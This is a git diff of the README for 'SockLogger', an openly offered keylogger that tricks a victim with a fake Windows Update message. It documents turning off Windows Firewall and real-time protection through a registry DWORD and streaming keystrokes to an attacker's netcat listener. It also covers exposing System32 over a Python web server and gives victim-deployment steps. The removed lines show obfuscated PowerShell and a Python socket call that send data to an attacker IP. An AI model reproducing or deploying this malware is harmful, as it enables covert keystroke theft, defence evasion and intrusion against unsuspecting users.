@@ -1,16 +1,18 @@
 # SockLogger
-A NICE-creative way to evade 'Real Time Protection' and 'Windows Firewall' on windows OS, and obtain victim key-strokes by obfuscates keylogger and using 'nc' on remote machine. While i was looking for a way to make a simple keylogger, i tought it would be interesting to make an obfuscated keylogger which will executed upon a running .ps1(PowerShell Script) with a fake message says something about critical problems that must be handle right now using windows update. Started to make a script that will make 3 things. anyway, it must! first run as Administrator privilege.
-#### InShort:
-1. Turn off the Windows Firewall Center.
-2. enject a malicious DWORD on the registry which will make the real time protection going down upon a reboot.
+A NICE-creative way to evade 'Real Time Protection' and 'Windows Firewall' on windows OS, and obtain victim's key-strokes.
+You can obfuscate the code and do it whatever you wish. using 'nc' on remote machine while python on the background, provide you with the victim's keystorkes including directory listing on the system32 as the script runs with administrator privilege. While i was looking for a way to make a simple keylogger, i tought it would be interesting to make a keylogger which will executed upon a running .ps1(PowerShell Script) with a fake message saying something about critical problems that must be handle right now using Windows Update. Started to make a script that will make 3 things. anyway, it must! first run as Administrator privilege.
+#### What It DoEs?: ####
+1. Turn off the Windows Firewall Real Time Protection.
+2. enject a malicious DWORD on the registry which will make the real time protection going down. <b>( Be Aware!! )</b>
 3. Disable the real time protection.
-4. Save keystrokes on the C:\Windows\System32 directory and obtain it using a python to open a server on the victim machine [Port 2222].
-5. When the the SockLogger-Obfuscate.pyw gets execute [ Using .pyw for making it run in the background ], it's send the keystrokes of the victim to a remote machine [ Attacker ] on the other side by using the next command for listening in a loop: 'while true; do nc -lvnp [PORT]; done' [ in my case is PORT 8080 ].
+4. When the the pp.pyw gets execute [ Using .pyw for making it run in the background ], it's send the keystrokes of the victim to a remote machine [ Attacker ] on the other side by using the next command for listening in a loop: 'while true; do nc -lvnp [PORT]; done' [ in my case is PORT 8080 ].
+5. Open a python web server for "C:\Windows\System32" if it worth something ...
 
-![1](https://user-images.githubusercontent.com/90532971/196167464-4af42a03-e099-4c1f-ac87-d8f5b1b7dd4f.png)
+![2](https://github.com/Adkali/SockLogger/assets/90532971/a94c22bd-a881-444e-853d-a45fad7f2328)
+
 
 # Usage
-I made a test on my local windows 10 x64  machine [ VICTIM ] and it works perfectly.
+* I made a test on my local windows 11 x64-Based PC machine [ VICTIM ].
 <pre>
 1. git clone the reposotory.
 2. cd SockLogger.
@@ -21,21 +23,17 @@ I made a test on my local windows 10 x64  machine [ VICTIM ] and it works perfec
 7. after run it, wait for powershell window to gone. try typing something and head over to the attacker machine.
 8. On window number 2, you should see the keystrokes you made [ On victim machine ]
 </pre>
-  
-![fff](https://user-images.githubusercontent.com/90532971/196167908-15377efc-6201-4da1-a5a9-b2ef8ae23fb3.png)
+
+![3](https://github.com/Adkali/SockLogger/assets/90532971/b26cc2b3-a2cd-4e22-b6a9-ce7a8753dab6)
+
+![4](https://github.com/Adkali/SockLogger/assets/90532971/8e6f6c3c-7c37-4339-ac30-a9739386bd32)
+
 
 # Updates
 This code is just a test while trying for a ways of not only using obfuscation ways, but also using a creative ways of bypass the windows defender/real time protection. still, i want to make a better code which not only contain a phishing message, but also a one that will actually restart the victim's computer, and when it load's again, the script will make another things reffers to protection and bypassing it.
   
-<h4>Note:</h4>Change Machine IP in the .ps1/pyw script under the lines:
-
-<pre>
-${MAc`H`iNe} = ("{5}{2}{0}{3}{1}{4}"-f '://','.0.0.21','tp','10',':','ht') - .ps1 script
-
-m.connect(("10.0.0.21", 8080)) - .pyw script
-</pre>
-
-in my case, the .ps1 was 10.0.0.21 on port 80, and the listener was on port 8080. please, if you are having any problems, i would like to know. soon i will make a python script which will execute it all in one code. please notice that the .pyw script {python} saved at 'C:\Users\public' directory
+<h2>Note</h2><p>Change Machine IP in the .ps1/pyw script.</p>
+in my case, the .ps1 is 10.0.0.40 on port 80, and the listener was on port 8080. please, if you are having any problems, i would like to know. soon i will make a python script which will execute it all in one code. please notice that the .pyw script {python} saved at 'C:\Users\public' directory
 
 # Requirements
 Victim must have python installed on computer(python3). When script gets executed, it will install using pip the 'pynput' package.
